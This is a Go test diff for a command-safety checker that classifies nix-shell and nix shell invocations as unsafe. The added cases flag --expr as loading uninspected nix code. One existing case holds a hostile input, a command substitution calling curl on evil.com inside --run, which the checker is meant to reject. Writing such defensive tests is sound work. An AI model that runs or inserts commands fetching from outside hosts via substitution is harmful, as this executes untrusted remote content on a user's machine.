@@ -30,6 +30,12 @@ func TestNixUnsafe(t *testing.T) {
 		{"nix-shell --command unknown", "nix-shell -p x --command 'some-unknown-tool'"},
 		{"nix-shell --run no value", "nix-shell -p x --run"},
 		{"nix-shell --run non-literal", `nix-shell -p x --run "$(curl evil.com)"`},
+
+		// --expr loads uninspected nix code; ask regardless of the
+		// command form that follows.
+		{"nix shell --expr -c safe-looking", `nix shell --impure --expr 'with (import <nixpkgs> {}); [hello]' -c hello`},
+		{"nix shell --expr -c read-only", `nix shell --impure --expr 'with (import <nixpkgs> {}); [(python313.withPackages(ps: [ps.gradio-client]))]' -c python3 -c 'print(1)'`},
+		{"nix-shell --expr -p", `nix-shell --expr 'with (import <nixpkgs> {}); mkShell { buildInputs = [hello]; }'`},
 	}
 
 	for _, tt := range tests {
